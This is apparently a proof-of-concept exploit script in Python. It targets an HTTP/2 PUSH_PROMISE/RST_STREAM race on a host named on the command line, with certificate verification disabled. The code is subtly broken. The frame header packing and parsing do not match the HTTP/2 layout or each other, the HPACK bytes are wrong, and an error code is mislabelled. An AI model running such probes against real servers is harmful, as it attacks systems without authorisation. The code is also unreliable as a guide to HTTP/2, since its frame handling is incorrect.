#!/usr/bin/env python3
import socket
import ssl
import struct
import time
import sys

# Minimal HTTP/2 frame constants
FRAME_TYPE_DATA = 0x0
FRAME_TYPE_HEADERS = 0x01
FRAME_TYPE_PUSH_PROMISE = 0x05
FRAME_TYPE_RST_STREAM = 0x03

FLAG_END_STREAM = 0x01
FLAG_END_HEADERS = 0x04

# Helper to build a raw HTTP/2 frame
# Format: 3-byte length, 1-byte type, 1-byte flags, 4-byte stream ID (MSB reserved)
def build_frame(frame_type, flags, stream_id, payload=b''):
    length = len(payload)
    header = struct.pack('!IHB', length, frame_type, flags)
    # Stream ID is 31 bits, MSB is reserved and must be 0 for client->server
    stream_id_bytes = struct.pack('!I', stream_id & 0x7FFFFFFF)
    return header + stream_id_bytes + payload

# Helper to parse the first frame from a buffer
def parse_frame(data):
    if len(data) < 9:
        return None, data
    length, frame_type, flags = struct.unpack('!IHB', data[:9])
    stream_id = struct.unpack('!I', data[9:13])[0] & 0x7FFFFFFF
    payload = data[13:13+length]
    remaining = data[13+length:]
    return (frame_type, flags, stream_id, payload), remaining

def send_data(sock, data):
    sock.sendall(data)
    print(f"[+] Sent {len(data)} bytes")

def receive_data(sock, timeout=2.0):
    sock.setblocking(False)
    start = time.time()
    buf = b''
    try:
        while time.time() - start < timeout:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                print(f"[+] Received {len(chunk)} bytes")
            except BlockingIOError:
                time.sleep(0.05)
    except Exception as e:
        print(f"[-] Receive error: {e}")
    finally:
        sock.setblocking(True)
    return buf

def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_http2_push_promise_desync.py <target_host> [--port PORT] [--insecure]")
        sys.exit(1)

    target = sys.argv[1]
    port = 443
    insecure = False
    if '--port' in sys.argv:
        idx = sys.argv.index('--port')
        port = int(sys.argv[idx+1])
    if '--insecure' in sys.argv:
        insecure = True

    print(f"[*] Connecting to {target}:{port}...")
    
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Wrap with SSL if needed
    if port == 443 or not insecure:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=target)
    
    try:
        sock.connect((target, port))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    # 1. Send HTTP/2 Connection Preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    send_data(sock, preface)
    
    # 2. Send SETTINGS frame (empty payload, just to acknowledge)
    settings_frame = build_frame(0x04, 0x0, 0, b'') # SETTINGS type is 0x04
    send_data(sock, settings_frame)
    
    # 3. Send a simple GET request on stream 1 to trigger server push
    # Minimal HPACK-encoded headers for GET / HTTP/1.1
    # :method: GET, :path: /, :scheme: https, :authority: target
    # This is a simplified representation. In reality, you'd use a proper HPACK encoder.
    # For PoC, we'll use a known good HPACK block or a minimal one.
    # Here's a minimal HPACK block for GET / on localhost (example)
    hpack_headers = bytes([
        0x82, # :method: GET (indexed)
        0x86, # :scheme: https (indexed)
        0x54, 0x08, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, # :authority: localhost (literal)
        0x40, # :path: / (indexed)
    ])
    
    headers_frame = build_frame(FRAME_TYPE_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, 1, hpack_headers)
    send_data(sock, headers_frame)
    
    print("[*] Waiting for server response and PUSH_PROMISE...")
    
    # 4. Receive frames and look for PUSH_PROMISE
    buf = receive_data(sock)
    
    promised_stream_id = None
    
    while buf:
        frame, buf = parse_frame(buf)
        if frame is None:
            break
            
        ftype, flags, sid, payload = frame
        
        if ftype == FRAME_TYPE_PUSH_PROMISE:
            print(f"[!] Received PUSH_PROMISE on stream {sid}")
            # Parse promised stream ID from payload
            if len(payload) >= 4:
                promised_stream_id = struct.unpack('!I', payload[:4])[0] & 0x7FFFFFFF
                print(f"[!] Promised Stream ID: {promised_stream_id}")
                
                # VULNERABILITY TRIGGER:
                # Immediately send RST_STREAM for the promised stream BEFORE fully processing
                # the PUSH_PROMISE or waiting for server DATA frames.
                # This races with the server's expectation that the stream is now 'reserved'.
                rst_payload = struct.pack('!I', 0x08) # NO_ERROR code
                rst_frame = build_frame(FRAME_TYPE_RST_STREAM, 0x0, promised_stream_id, rst_payload)
                send_data(sock, rst_frame)
                print(f"[+] Sent RST_STREAM for promised stream {promised_stream_id}")
                
                # In a vulnerable implementation, the server might have already started sending
                # DATA on this stream or miscalculated flow control credits.
                # We continue to receive to see if the server sends DATA on a reset stream.
                
        elif ftype == FRAME_TYPE_DATA:
            if promised_stream_id and sid == promised_stream_id:
                print(f"[VULN] Server sent DATA on reset promised stream {sid}! Length: {len(payload)}")
                print("[VULN] This indicates a desync in stream state management.")
            else:
                print(f"[+] Received DATA on stream {sid}, length: {len(payload)}")
                
        elif ftype == FRAME_TYPE_HEADERS:
            print(f"[+] Received HEADERS on stream {sid}")
            
        # If we found the promised stream and sent RST, we can stop or continue monitoring
        if promised_stream_id:
            # Give the server a moment to react
            time.sleep(0.5)
            more_data = receive_data(sock)
            if more_data:
                buf += more_data
            else:
                break

    print("[*] Test complete.")
    sock.close()

if __name__ == '__main__':
    main()